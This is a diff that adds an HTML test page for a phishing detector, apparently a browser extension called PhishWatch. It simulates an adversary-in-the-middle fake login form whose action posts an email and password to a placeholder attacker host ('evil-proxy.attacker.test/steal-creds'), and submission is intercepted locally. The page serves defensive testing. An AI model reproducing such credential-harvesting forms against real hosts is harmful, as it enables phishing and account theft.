@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gate 2 Test: Form Action Mismatch</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      max-width: 600px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #1a1a1a;
+      color: #e0e0e0;
+    }
+    .test-box {
+      background: #252525;
+      border: 1px solid #333;
+      border-radius: 12px;
+      padding: 30px;
+      margin: 20px 0;
+    }
+    .test-box.danger {
+      border-color: #5a2727;
+      background: #2a1a1a;
+    }
+    h1 { color: #4a9eff; }
+    label { display: block; margin-bottom: 8px; color: #aaa; }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #444;
+      border-radius: 8px;
+      background: #1a1a1a;
+      color: #fff;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #4a9eff;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #ff6b6b;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #ff5252;
+    }
+    .instructions {
+      background: #2a1e1e;
+      border: 1px solid #5a2727;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 20px;
+    }
+    .badge {
+      display: inline-block;
+      padding: 4px 10px;
+      background: #5a2727;
+      color: #ff6b6b;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .warning-box {
+      background: #3a2a1a;
+      border: 1px solid #5a4a27;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 15px 0;
+    }
+    code {
+      background: #333;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    a { color: #4a9eff; }
+  </style>
+</head>
+<body>
+  <h1>⚠️ Gate 2 Test: Form Action Mismatch</h1>
+  <p><span class="badge">SHOULD FIRE</span> Form action points to different origin - primary AiTM indicator</p>
+  
+  <div class="warning-box">
+    <strong>⚠️ This simulates an AiTM attack pattern</strong><br>
+    Page origin: <code>http://localhost:8080</code><br>
+    Form action: <code>https://evil-proxy.attacker.test</code>
+  </div>
+  
+  <div class="test-box danger">
+    <h3 style="color: #ff6b6b; margin-top: 0;">🎣 Fake Login Page</h3>
+    <p style="color: #888;">This form submits to a different origin (simulated attacker server)</p>
+    
+    <!-- Form action points to external origin -->
+    <form id="phishing-form" action="https://evil-proxy.attacker.test/steal-creds" method="POST" onsubmit="handleSubmit(event)">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" placeholder="victim@example.com" value="victim@example.com">
+      
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter password" value="secretpassword">
+      
+      <button type="submit">Sign In (Malicious)</button>
+    </form>
+  </div>
+  
+  <div class="instructions">
+    <strong>Instructions:</strong>
+    <ol>
+      <li>Open DevTools Console (F12)</li>
+      <li>Filter by <code>[PhishWatch</code></li>
+      <li>Click on the password field first</li>
+      <li>Verify you see:
+        <ul>
+          <li><code>form action analysis... originMismatch: true, sameSite: false, isTrustedAuth: false, isSuspicious: true</code></li>
+          <li><code>form_action_origin_mismatch</code> research signal</li>
+          <li><code>formActionMismatch: true</code> in treadmill state</li>
+        </ul>
+      </li>
+      <li>Then click "Sign In" to test submit behavior</li>
+    </ol>
+    <p><strong>Why this matters:</strong> AiTM proxies must forward credentials to their server. The form action mismatch is the most reliable mechanical indicator of this attack pattern.</p>
+  </div>
+  
+  <p><a href="../index.html">← Back to Test Harness</a></p>
+  
+  <script>
+    function handleSubmit(e) {
+      e.preventDefault();
+      console.log('[Test] Malicious form submit intercepted');
+      alert('Malicious form submit intercepted.\n\nCheck console for:\n- form_action_origin_mismatch signal\n- formActionMismatch: true');
+    }
+  </script>
+</body>
+</html>
